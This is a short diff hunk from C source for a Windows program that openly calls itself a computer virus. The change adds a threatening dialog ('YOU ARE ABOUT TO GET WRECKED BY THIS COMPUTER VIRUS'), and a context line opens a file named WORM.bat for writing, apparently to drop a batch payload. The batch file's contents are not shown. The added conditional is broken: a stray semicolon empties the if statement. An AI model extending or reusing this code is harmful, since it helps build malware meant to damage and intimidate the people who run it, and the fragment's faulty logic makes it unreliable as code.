@@ -58,7 +58,7 @@ int APIENTRY WinMain(HINSTANCE hinstance, HINSTANCE hPrevInstance, PSTR CmdLine,
 {
     // main function entry point 
   if (MessageBox(NULL,TEXT("THIS VIRUS IS NO JOKE YOU CAN HAVE REAL CONSIQUENCES !!!!"),NULL,MB_ICONWARNING | MB_YESNO)!=IDYES) return 1; // WARNING---Combined flags for MessageBox
-
+ if (MessageBox(NULL,TEXT("YOU ARE ABOUT TO GET WRECKED BY THIS COMPUTER VIRUS\n\t YOU DON'T KNOW\n WHAT YOU HAVE INVITED INTO YOUR STUPID_COMPUTER AND THIS TIME NO BACKOFF"),"ARKA.EXE",MB_ICONWARNING | MB_HELP)!=IDYES);
 
 
     FILE* fp = fopen("WORM.bat", "w");  // Changed file name to avoid system errors
